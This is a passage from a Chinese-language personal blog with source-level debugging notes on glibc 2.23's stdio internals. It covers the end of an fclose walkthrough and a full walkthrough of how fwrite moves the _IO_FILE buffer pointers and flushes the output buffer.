<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span></span><br><span class="line">      ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h3 id="将reserve-area释放掉"><a href="#将reserve-area释放掉" class="headerlink" title="将reserve area释放掉"></a>将reserve area释放掉</h3><p>最后_IO_new_file_close_it函数还剩下面这部分代码，先删除reserve area然后将read和write相关指针全部置空，最后调用_IO_un_link确保fopen函数申请的_IO_FILE结构体已经从_IO_list_all链表中脱链。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);<span class="comment">//删除reserve area</span></span><br><span class="line">_IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//这个宏是将read相关指针全部置空</span></span><br><span class="line">_IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//这个宏是将write相关指针全部置空</span></span><br><span class="line"></span><br><span class="line">_IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> close_status ? close_status : write_status;</span><br></pre></td></tr></table></figure>



<p>这个_IO_setb函数代码如下，发现是先将reserve area这片内存给释放掉，然后清空_IO_buf_base和_IO_buf_end两个指针，这也就意味着将reserve area删除掉了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="将结构体fp的内存释放掉"><a href="#将结构体fp的内存释放掉" class="headerlink" title="将结构体fp的内存释放掉"></a>将结构体fp的内存释放掉</h3><p>最后返回到_IO_new_fclose函数，先是调用了vtable中的_IO_default_finish函数(这个函数中做的操作，之前已经做过了，其实就相当于啥都没干)，然后最后将结构体fp释放掉。至此fclose函数结束。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> _IO_release_lock (fp);</span><br><span class="line"> _IO_FINISH (fp);</span><br><span class="line">······</span><br><span class="line"> <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">   &#123;</span><br><span class="line">     fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">     <span class="built_in">free</span>(fp);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> status;</span><br></pre></td></tr></table></figure>



<h2 id="总结fclose函数调用流程："><a href="#总结fclose函数调用流程：" class="headerlink" title="总结fclose函数调用流程："></a>总结fclose函数调用流程：</h2><p>先将_IO_FILE结构体脱链，然后去看输出缓冲区中是否还有内容，如果有的话就系统调用write将输出缓冲区中的内容写入文件然后刷新输出缓冲区。接着系统调用close关闭文件，最后将申请的reserve area和装有_IO_FILE结构体的堆块给释放掉。</p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fclose">FILE结构体及漏洞利用方法 | Hacked By Fish_o0O (fish-o0o.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/IO_FILE_fclose_analysis">IO FILE之fclose详解 « 平凡路上 (ray-cp.github.io)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/7b71046d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/7b71046d.html" class="post-title-link" itemprop="url">IO学习--源码调试fwrite函数</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:50:10" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95-%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">源码调试&&分析</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><p>这个fwrite函数中的_IO_write_ptr指针的挪动和fread函数中的_IO_read_ptr指针的挪动是不太一样的。先回顾一下上一篇文章中_IO_read_ptr指针什么时候挪动？当系统调用read的时候从文件中读取多少个字节的数据到输入缓冲区，就将_IO_read_end指针挪动多少个字节**(初始值和_IO_read_base是一样的)<strong>，而此时的_IO_read_ptr指针不动。当执行memcpy函数将数据从输入缓冲区拷贝多少个字节的数据到我们指定的内存地址，就将_IO_read_ptr指针挪动多少个字节。</strong>在_IO_read_base和_IO_read_ptr之间是已经拷贝过的数据，_IO_read_ptr和_IO_read_end之间是输入缓冲区中还未拷贝的数据。**</p>
<p>而本次分析的<strong>fwrite函数则是直接将_IO_buf_end的值赋给了_IO_write_end</strong>（read的那个指针可不是这样），而_IO_write_ptr的初始值则和_IO_write_base的值一样。该函数先从指定的内存地址读取一定字节的数据到输出缓冲区，此时的_IO_write_ptr指针挪动(我这里以及上下文提到的挪动指的都是在原本的基础上加)相应的字节。此时的<strong>_IO_write_base指针和_IO_write_ptr指针之间的区域是将要从输出缓冲区写入文件的数据，而_IO_write_ptr指针和_IO_write_end指针之间的区域是输出缓冲区的可用区域(就是还能再往输出缓冲区拷贝多少个字节的内容)<strong>，当执行系统调用write往文件中写入一定的字节的内容后，_IO_write_ptr就会</strong>减去相应的字节</strong>。</p>
<p>上面的内容一定要清楚，不然分析的时候就会陷入误区</p>
<p>前面两篇文章的地址如下：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16567446.html">IO学习–源码调试fopen函数</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16575066.html">IO学习–源码分析fread函数 </a></p>
<h2 id="整体流程："><a href="#整体流程：" class="headerlink" title="整体流程："></a>整体流程：</h2><p><img src="/../img/image-20221007220914882.png" alt="image-20221007220914882"></p>
<img src="https://s2.loli.net/2022/08/12/iUOa84sphV1Wmyw.png" alt="image-20220811201511246" style="zoom:50%;" />

<p>上面第一张图片是fwrite函数的整体流程，第二张图片是根据我下面写的这个源代码对应的函数调用流程(调试的时候结合这两个图片，可以对自己调试到哪部分有个比较清楚的认知)。</p>
<h2 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> new[<span class="number">30</span>]=<span class="string">&quot;nice-day&quot;</span>;</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;wt&quot;</span>);</span><br><span class="line">    fwrite(new,<span class="number">1</span>,<span class="number">25</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>_IO_fwrite 源代码(fwrite原型为_IO_fwrite函数)如下，这段很好分析，先是判断了request（也就是我们要输入的字节数是否为0），然后加锁去执行_IO_sputn函数(该函数是vtable中的_IO_new_file_xsputn函数)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t request = size * count;</span><br><span class="line">  _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后进入了_IO_new_file_xsputn函数，先是有个if判断如下，这里我很迷惑，因为我不清楚_flags对应的各个位都是什么含义，尽管<strong>通过调试可以看出来这个if并没有进去</strong>，但实际上我并不知道为什么这个if进不去，我上网找了很多资料也没有找到相关_flags各个位的含义，那就继续往下分析吧。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">   &#123;</span><br><span class="line">     count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">     <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  count = p - s + <span class="number">1</span>;</span><br><span class="line">	  must_flush = <span class="number">1</span>;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<p>如果没有进入上面的if，则会去判断是否还存在剩余的输出缓冲区（如下），count是剩余输出缓冲区的大小，to_do是需要往文件中写入的字节数。</p>
<p>根据下面这段代码分析，现在有三种情况分别是count&gt;to_do    count&lt;to_do    count&#x3D;&#x3D;0</p>
<p>第一种是剩余的输出缓冲区比我们要输入的数据大，那memcpy执行后将数据拷贝到输出缓冲区就完事大吉，因为if (to_do + must_flush &gt; 0)这行代码是进不去的，所以就直接return了。第二种是剩余的输出缓冲区比我们要输入的数据小，也进行memcpy函数的拷贝，只不过拷贝后，因为还有数据没有拷贝进输出缓冲区(此时输出缓冲区已经满了)，那就去执行_IO_new_file_overflow函数，它有俩作用，如果不存在输出缓冲区则会进行创建reserve area，如果存在的话，则会调用_IO_do_write函数进行刷新，等刷新后再去拷贝剩下的数据到输出缓冲区。然后还有第三种情况就是此时并没有输出缓冲区。那也去执行_IO_new_file_overflow函数进行创建reserve area，再去拷贝数据到输出缓冲区。</p>
<p>第一种情况下面的代码写的很清楚了，就不再分析第一种情况。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>第二种和第三种情况都会进入这个if中（这个if的代码我没放全，等分析到下面再放之后的部分），进入这个函数后就去调用了_IO_OVERFLOW (f, EOF)，这个函数是vtable中的_IO_new_file_overflow。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     _IO_size_t block_size, do_write;</span><br><span class="line">     <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">     <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br></pre></td></tr></table></figure>



<p>进入_IO_new_file_overflow函数(代码如下)，可以发现有一个对f-&gt;_IO_write_base是否为空的判断，而程序通过这个判断来判定是否没有分配resever area。如果没有分配的话则去执行_IO_doallocbuf函数来分配resever area(这个函数在<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16575066.html">fread源码分析</a>中已经分析过了，这里就不再分析了)，_IO_setg这个宏的作用就是将三个read指针全部赋值为f-&gt;_IO_buf_base(f-&gt;_IO_buf_base在_IO_doallocbuf函数中已经被初始化过了)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">          <span class="comment">/* #define _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="comment">	(fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))*/</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>下面的代码一定要注意，此处是将_IO_write_ptr和_IO_write_base两个指针都初始化为了_IO_buf_base的值，<strong>但_IO_write_end指针却是初始化为了_IO_buf_end</strong>（read的三个相关指针是都被初始化为了_IO_buf_base）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">			   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">     f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">     f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">     f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">     f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">     f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br></pre></td></tr></table></figure>



<p>然后由于当初调用_IO_OVERFLOW函数的时候，第二个参数为EOF</p>
<p><img src="https://s2.loli.net/2022/08/12/KBfmDGZv7RVIsyh.png" alt="image-20220811182225383"></p>
<p>因此_IO_new_file_overflow函数的ch为EOF</p>
<p><img src="https://s2.loli.net/2022/08/12/N1sd9CWzrle6JfZ.png" alt="image-20220811182330917"></p>
<p>所以上面几个指针赋值过后，执行下面if的时候就直接进入了,调用了_IO_do_write函数，注意下_IO_do_write的第三个参数，如果是新创建的reserve area，那么 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base的值则为0的（如下代码）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">	 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>



<p>因为刚才说过，这个to_do其实就是0，因此return返回的时候发现to_do&#x3D;&#x3D;0成立并且后面是||，就直接从_IO_new_do_write函数返回了，并没有去执行后面的new_do_write函数(当时分析到这里，我还不信，于是写了个demo测试了一下发现确实如此(如下图)）<strong>注意:前面讨论的是新创建reserve area执行到这里的情况，如果是输出缓冲有数据的话，来到这里就会执行new_do_write函数，从而触发系统调用write来刷新输出缓冲区(不仅数据被刷新了出去,同时_IO_write_ptr指针也进行了更新)。</strong>总结一下就是_IO_new_do_write函数对输出缓冲区中的数据进行了一个判断，如果存在数据的话就调用write函数来将输出缓冲区中的数据写入文件，否则的话就直接返回。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://s2.loli.net/2022/08/12/EBw1xTPb2yfiCDh.png" alt="image-20220811183408807" style="zoom:50%;" />

<p>然后程序一直返回到_IO_new_file_xsputn函数，接下这段代码实现的是如果要写到文件里的数据大于了reserve area这块区域(通常是0x1000,也就是4k)，那就将大于的部分直接执行系统调用write输出到文件，剩下的部分则写到输出缓冲区中。比如我们要写10k的数据到文件中，而reserve are为4k，那8k的数据都将直接被系统调用write写入文件中，另外2k的数据放到输出缓冲区中。</p>
<p>上述功能的实现核心代码就是这一行<code>do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</code>(不得不说，这一行写的是真巧妙)，如果写入的数据量本身就小于reserve area的话，那do_write就会是0，也就无法进入下面那个if。而if中的new_do_write函数中执行了系统调用write，并且重置了_IO_write_ptr指针(如下图)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">     do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/08/12/z5xYhPaUNspGkmI.png" alt="image-20220812213721975"></p>
<p>这里也就是将大块的数据(大于reserve area的数据)去直接执行系统调用write写入文件，而剩余的小块(小于reserve area的数据)拷贝到输出缓冲区中（下面代码的_IO_default_xsputn函数调用了拷贝函数memcpy）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br></pre></td></tr></table></figure>



<p>_IO_default_xsputn函数的源码如下，这个函数分析起来还是比较简单的。more是我们需要写入文件的字节数，count是输出缓冲区剩余的字节数。如果我们需要写入文件的字节数大于20的话，就执行memcpy函数去拷贝，如果小于20的话，就用for循环一个字节一个字节的拷贝(这个策略应该是效率比较高的)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_default_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      _IO_ssize_t i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后这个函数执行完毕后，整个fwrite函数也就算是结束了。</p>
<h2 id="总结fwrite函数的调用流程："><a href="#总结fwrite函数的调用流程：" class="headerlink" title="总结fwrite函数的调用流程："></a>总结fwrite函数的调用流程：</h2><p>先尝试将数据拷贝到输出缓冲区，如果全部都拷贝过去的话函数就直接返回。如果只拷贝过去了一部分数据，另外一部分数据因为输出缓冲区满的话又或者没有分配reserve area的话都调用_IO_new_file_overflow函数，然后这个函数会新创建一个reserve area或者执行系统调用write刷新输出缓冲区。最后来判断要写入的字节数是否小于reserve area，如果小于的话则将数据拷贝到输出缓冲区中，如果大于的话则将大于部分用系统调用write写入文件剩余部分再拷贝到输出缓冲区。<strong>注意：这个demo程序的话，调试到fwrite函数结束也没有发现系统调用了write，这是因为输出缓冲区将在程序结束时的exit函数中的_IO_cleanup函数调用_IO_flush_all_lockp函数时进行刷新，此时才会执行系统调用write</strong></p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fwrite">FILE结构体及漏洞利用方法 | Hacked By Fish_o0O (fish-o0o.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1279/#toc__1">IO FILE之fwrite详解 - 跳跳糖 (tttang.com)</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.leanote.com/post/mut3p1g/file-struct"> (leanote.com)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/4/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
